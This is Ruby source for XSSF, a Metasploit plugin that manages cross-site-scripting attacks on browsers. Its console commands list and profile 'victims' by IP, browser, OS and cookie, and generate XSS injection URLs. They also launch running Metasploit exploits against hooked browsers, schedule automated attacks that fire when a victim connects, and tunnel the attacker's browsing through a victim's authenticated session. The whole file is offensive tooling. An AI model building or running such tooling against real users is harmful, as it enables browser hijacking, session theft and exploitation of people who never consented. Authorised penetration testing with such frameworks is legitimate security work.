module Msf

	# This plugin manages a new XSS framework integrated to Metasploit
	class Plugin::Xssf < Msf::Plugin
		include Msf::Xssf::XssfMaster
		
		#
		# Called when an instance of the plugin is created.
		#
		def initialize(framework, opts)
			super

			clean_database;	Msf::Xssf::AUTO_ATTACKS.clear

			@DefaultPort = Msf::Xssf::SERVER_PORT;		@DefaultUri  = Msf::Xssf::SERVER_URI;	@defaultPublic = false;	@defaultMode = 'Normal';

			# Check if parameters are correct if entered
			opts['Port'].to_s 	=~ /^(6553[0-5]|655[0-2]\d|65[0-4]\d\d|6[0-4]\d{3}|[1-5]\d{4}|[1-9]\d{0,3}|0)$/ ? port = Integer(opts['Port']) : port = @DefaultPort
			opts['Uri'].to_s  	=~ /^\/?([a-zA-Z0-9\-\._\?\,\'\/\\\+&amp;%\$#\=~])+$/ ? uri = opts['Uri'].to_s : uri = @DefaultUri
			
			opts['Public'].to_s =~ /^true$/ ? Msf::Xssf::XSSF_PUBLIC[0] = true : Msf::Xssf::XSSF_PUBLIC[0] = @DefaultPublic
			
			opts['Mode'].to_s =~ /^(Quiet|Normal|Verbose|Debug)$/i ? Msf::Xssf::XSSF_MODE[0] = $1 : Msf::Xssf::XSSF_MODE[0] = @DefaultMode
			
			uri = '/' + uri if (uri[0].chr  != "/")
			uri = uri + '/' if (uri[-1].chr != "/")
			
			if (not framework.db.active)
				print_error("The database backend has not been initialized ...")
				print_status("Please connect MSF to an installed database before loading XSSF !")
				raise PluginLoadError.new("Failed to connect to the database.")
			end

			framework.plugins.each { |p| raise PluginLoadError.new("This plugin should not be loaded more than once") if (p.class == Msf::Plugin::Xssf)	}
			
			begin
				raise "Database Busy..." if not start(port, uri)
				add_console_dispatcher(ConsoleCommandDispatcher)
				print_error("Your Ruby version is #{RUBY_VERSION.to_s}. Make sure your version is up-to-date with the last non-vulnerable version before using XSSF!\n\n")
				print_line("%cya" + Xssf::XssfBanner.to_s + "%clr\n\n")

				print_good("Please use command 'xssf_urls' to see useful XSSF URLs")
			rescue
				raise PluginLoadError.new("Error starting server: #{$!}")
			end
		end

		#
		# Removes the console menus created by the plugin
		#
		def cleanup
			stop
			remove_console_dispatcher('xssf')
		end
		
		#
		# This method returns a short, friendly name for the plugin.
		#
		def name
			"xssf"
		end

		#
		# Returns description of the plugin (60 chars max)
		#
		def desc
			"XSS Framework managing XSS modules"
		end


		# This class implements a sample console command dispatcher.
		class ConsoleCommandDispatcher
			include Msf::Ui::Console::CommandDispatcher
			include Msf::Xssf::XssfMaster


			#
			# The dispatcher's name.
			#
			def name
				"xssf"
			end

			#
			# Commands supported by this dispatcher.
			# TODO: xssf_logs [VictimID], xssf_log [logID]
			#
			def commands
				{
					# INFORMATION COMMANDS
					"xssf_victims"   			=> "Displays all victims",
					"xssf_active_victims"  		=> "Displays active victims",
					"xssf_information"			=> "Displays information about a given victim",
					"xssf_servers"   			=> "Displays all used attack servers",
					"xssf_logs"					=> "Displays logs about a given victim",
					"xssf_log"					=> "Displays log with given ID",
					
					# NON-XSSF MODULES ATTACKS
					"xssf_tunnel"   			=> "Do a tunnel between attacker and victim",
					"xssf_exploit"				=> "Launches a launched module (running in jobs) on a given victim",
					
					# AUTOMATED ATTACKS COMMANDS
					"xssf_add_auto_attack"  	=> "Add a new automated attack (launched automatically at victim's connection)",
					"xssf_remove_auto_attack"	=> "Remove an automated attack",
					"xssf_auto_attacks"			=> "Displays XSSF automated attacks",
					
					# DATABASE COMMANDS
					"xssf_remove_victims"		=> "Remove victims in database",
					"xssf_clean_victims"		=> "Clean victims in database (delete waiting attacks)",
					
					# OTHERS
					"xssf_urls"					=> "List useful available URLs provided by XSSF",
					"xssf_banner"				=> "Prints XSS Framework banner !"
				}
			end

			def cmd_xssf_exploit(*args)
				url = nil 
				begin
					raise "Wrong arguments: [JobID] must be an Integer." unless (args[-1].to_s =~ /^([0-9]+)$/)
				
					print_status("Searching Metasploit launched module with JobID = '#{args[-1].to_s}'...")
					
					# Watching if jobID is an running module
					if (obj = framework.jobs[args[-1]])
						print_good("A running exploit exists: '#{obj.name}'")
						datastore = obj.ctx[0].datastore
						url = "http://#{Rex::Socket.source_address('1.2.3.4')}:#{datastore['SRVPORT']}#{obj.ctx[0].get_resource}"
						process_victims_string((args[0..-2] * ' ').gsub(/\s*/, ''), "attack_victim", url, obj.name)
					else
						raise "No Metasploit launched module was found... Please run one first or check JobID parameter !"
					end
					
					print_status("Exploit execution started, press [CTRL + C] to stop it !") 
					
					puts ""; attacked_victims
					# Loop and wait for console interruption
					while (true) do; Rex::ThreadSafe.sleep(5); end;
						
				rescue ::Interrupt
					print_error("Exploit interrupted by the console user")
				rescue ::Exception
					print_error("#{$!}")
					print_error("Wrong arguments: xssf_exploit [VictimIDs] [JobID]")
					print_error("Use MSF 'jobs' command to see running jobs")
				end
			end

			def cmd_xssf_tunnel(*args)
				if (args.length == 1)
					begin
						raise "Wrong arguments: [VictimID] must be an Integer" unless (args[0].to_s =~ /^([0-9]+)$/)

						victim = tunnel_victim(args[0])		
							
						raise "Victim #{args[0].to_s} does not exist or is no longer active" if not victim
						raise "Victim has 'Unknown' location in database" if (victim.location == "Unknown")

						uri = URI.parse(URI.escape(CGI::unescape(victim.location)))
					
						print_status("Creating new tunnel with victim '#{args[0].to_s}' (#{uri.scheme}://#{uri.host}:#{uri.port}) ...")
						print_status("You can now add XSSF as your browser proxy (command 'xssf_url' to get proxy infos) and visit domain of victim '#{args[0].to_s}' ! ;-)\n")
						print_status("NOTE: Other HTTP domains are also accessible through XSSF Tunnel, but user session won't be available\n")
							
						if (uri.scheme == 'https')
							print_status("IMPORTANT: Victim domain is HTTPS! Please use HTTP protocol instead (example: #{uri.scheme}://#{uri.host}:#{uri.port} => http://#{uri.host}/)")
						end

						while (victim_tunneled) do; 	Rex::ThreadSafe.sleep(5);	end
								
						raise "Victim #{args[0].to_s} is no longer active"

					rescue ::Interrupt
						print_error("Tunnel interrupted by the console user")
					rescue ::Exception
						print_error("#{$!}")
					end
						
					clean_victim(args[0])
					print_status("Removing tunnel with victim #{args[0].to_s} ...")
				else
					print_error("Wrong arguments: xssf_tunnel_victim [VictimID]")
				end
			end
			
			def cmd_xssf_information(*args)
				# Check if victim ID is correct if one is entered
				if (args.length == 1)
					print_error("Wrong arguments: [VictimID] must be an Integer") unless (args[0].to_s =~ /^([0-9]+)$/)
					
					victim = get_victim(args[0])
					
					if (victim)
						secs = (victim.last_request - victim.first_request).to_i;
						
						print_line
						print_line "INFORMATION ABOUT VICTIM #{args[0]}"
						print_line "============================"
						print_line "IP ADDRESS \t: #{victim.ip}"
						print_line "ACTIVE ? \t: #{victim.active ? "TRUE" : "FALSE"}"
						print_line "FIRST REQUEST \t: #{victim.first_request}"
						print_line "LAST REQUEST \t: #{victim.last_request}"
						print_line "CONNECTION TIME : #{secs/3600 % 24}hr #{secs/60 % 60}min #{secs % 60}sec"
						print_line "BROWSER NAME \t: #{victim.browser_name}"
						print_line "BROWSER VERSION : #{victim.browser_version}"
						print_line "OS NAME\t\t: #{victim.os_name}"
						print_line "OS VERSION \t: #{victim.os_version}"
						print_line "ARCHITECTURE \t: #{victim.arch}"
						print_line "LOCATION \t: #{victim.location}"
						print_line "XSSF COOKIE ?\t: #{victim.cookie}"
						print_line "RUNNING ATTACK \t: #{victim.current_attack_url ? victim.current_attack_url : "NONE"}"
						print_line "WAITING ATTACKS : #{count_waiting_attacks(args[0]).to_s}"
					else
						print_error("Error getting victim '#{args[0]}'!")
					end
					

				else
					print_error("Wrong arguments: xssf_information [VictimID]")
				end
			end

			
			def cmd_xssf_auto_attacks(*args)
				print_good("Automated attacks:")
				Msf::Xssf::AUTO_ATTACKS.each do |a|
					if (framework.jobs[a])
						puts "\t * #{a} - #{framework.jobs[a].name}"
					else
						puts "\t * Job #{a} is no longuer active... please remove it !"
					end
				end
				
				puts "\t * NONE" if Msf::Xssf::AUTO_ATTACKS.empty?
			end
			
			
			def cmd_xssf_add_auto_attack(*args)	
				if (args.length == 1)	
					raise "Wrong arguments: [JobID] must be an Integer" unless (args[0].to_s =~ /^([0-9]+)$/)
				
					print_status("Searching Metasploit launched module with JobID = '#{args[0].to_s}'...")
						
					# Watching if jobID is an running module
					if (framework.jobs[args[0]])
						Msf::Xssf::AUTO_ATTACKS << args[0] if not Msf::Xssf::AUTO_ATTACKS.include?(args[0])
						print_good("Job '#{args[0]}' added to automated attacks")
					else
						print_error("No Metasploit launched module was found... Please run one first or check JobID parameter !")
					end
				else
					print_error("Wrong arguments: xssf_add_auto_attack [JobID]")
					print_error("Use MSF 'jobs' command to see running jobs")
				end
			end
			
			
			def cmd_xssf_remove_auto_attack(*args)	
				if (args.length == 1)	
					raise "Wrong arguments: [JobID] must be an Integer" unless (args[0].to_s =~ /^([0-9]+)$/)
				
					Msf::Xssf::AUTO_ATTACKS.delete(args[0])
					print_good("Job '#{args[0]}' removed from automated attacks")
				else
					print_error("Wrong arguments: xssf_remove_auto_attack [JobID]")
					print_error("Use MSF 'jobs' command to see running jobs")
				end
			end

			
			def cmd_xssf_urls(*args)
				srv  = active_server;	host = srv[0];	port = srv[1];	uri  = srv[2]
				
				print_good("XSSF Server \t : 'http://#{host}:#{port}#{uri}' \t\tor 'http://<PUBLIC-IP>:#{port}#{uri}'")
				print_good("Generic XSS injection: 'http://#{host}:#{port}#{uri}#{Msf::Xssf::VICTIM_LOOP}' \tor 'http://<PUBLIC-IP>:#{port}#{uri}#{Msf::Xssf::VICTIM_LOOP}'")
				print_good("XSSF test page\t : 'http://#{host}:#{port}#{uri}#{Msf::Xssf::VICTIM_TEST}' or 'http://<PUBLIC-IP>:#{port}#{uri}#{Msf::Xssf::VICTIM_TEST}'")
				
				puts ""
				
				if (Msf::Xssf::XSSF_PUBLIC[0])
					print_good("XSSF Tunnel Proxy\t: '#{host}:#{port + 1}' \t\t\t\t\ \ \ \ or '<PUBLIC-IP>:#{port + 1}'")
					print_good("XSSF logs page\t: 'http://#{host}:#{port + 1}#{uri}#{Msf::Xssf::VICTIM_GUI}?#{Msf::Xssf::PARAM_GUI_PAGE}=main' \ or 'http://<PUBLIC-IP>:#{port + 1}#{uri}#{Msf::Xssf::VICTIM_GUI}?#{Msf::Xssf::PARAM_GUI_PAGE}=main'")
					print_good("XSSF statistics page: 'http://#{host}:#{port + 1}#{uri}#{Msf::Xssf::VICTIM_GUI}?#{Msf::Xssf::PARAM_GUI_PAGE}=stats' or 'http://<PUBLIC-IP>:#{port + 1}#{uri}#{Msf::Xssf::VICTIM_GUI}?#{Msf::Xssf::PARAM_GUI_PAGE}=stats'")
					print_good("XSSF help page\t: 'http://#{host}:#{port + 1}#{uri}#{Msf::Xssf::VICTIM_GUI}?#{Msf::Xssf::PARAM_GUI_PAGE}=help' \ or 'http://<PUBLIC-IP>:#{port + 1}#{uri}#{Msf::Xssf::VICTIM_GUI}?#{Msf::Xssf::PARAM_GUI_PAGE}=help'")
				else
					print_good("XSSF Tunnel Proxy\t: 'localhost:#{port + 1}'")
					print_good("XSSF logs page\t: 'http://localhost:#{port + 1}#{uri}#{Msf::Xssf::VICTIM_GUI}?#{Msf::Xssf::PARAM_GUI_PAGE}=main'")
					print_good("XSSF statistics page: 'http://localhost:#{port + 1}#{uri}#{Msf::Xssf::VICTIM_GUI}?#{Msf::Xssf::PARAM_GUI_PAGE}=stats'")
					print_good("XSSF help page\t: 'http://localhost:#{port + 1}#{uri}#{Msf::Xssf::VICTIM_GUI}?#{Msf::Xssf::PARAM_GUI_PAGE}=help'")
				end
			end
			
			def cmd_xssf_logs(*args)
				if (args.length == 1)	
					raise "Wrong arguments: [VictimID] must be an Integer" unless (args[0].to_s =~ /^([0-9]+)$/)
				
					show_table("Victim #{args[0].to_s} logs", DBManager::XssfLog, ["xssf_victim_id = ?", args[0].to_i], ["xssf_victim_id", "result"]); 
					
					print_status("Info: Logs with an empty name are just launched attacks logs and does not contain results!");
				else
					print_error("Wrong arguments: xssf_logs [VictimID]")
				end
			end
			
			def cmd_xssf_log(*args)
				if (args.length == 1)	
					raise "Wrong arguments: [LogID] must be an Integer" unless (args[0].to_s =~ /^([0-9]+)$/)
				
					print_good("Result stored on log #{args[0].to_s}:")
					puts get_log_content(args[0].to_i)
				else
					print_error("Wrong arguments: xssf_logs [LogID]")
				end
			end
			
			def cmd_xssf_remove_victims	(*args);	process_victims_string((args * ' ').gsub(/\s*/, ''), "remove_victim", nil, nil);																																																end;
			def cmd_xssf_clean_victims	(*args);	process_victims_string((args * ' ').gsub(/\s*/, ''), "clean_victim", nil, nil);																																																	end;
			def cmd_xssf_banner			(*args);	print_line("%cya" + Xssf::XssfBanner.to_s + "%clr\n\n");																																																						end;
			def cmd_xssf_servers		(*args);	show_table("Servers", DBManager::XssfServer);																																																									end;
			def cmd_xssf_victims		(*args);	show_table("Victims", DBManager::XssfVictim, ["1 = 1"], ["first_request", "last_request", "tunneled", "current_attack_url", "location", "os_name", "os_version", "arch"]);				print_status("Use xssf_information [VictimID] to see more information about a victim");	end;
			def cmd_xssf_active_victims	(*args);	show_table("Victims", DBManager::XssfVictim, ["active = ?", true], ["first_request", "last_request", "tunneled", "current_attack_url", "location", "os_name", "os_version", "arch"]); 	print_status("Use xssf_information [VictimID] to see more information about a victim");	end;
		end
		
	protected
	end
end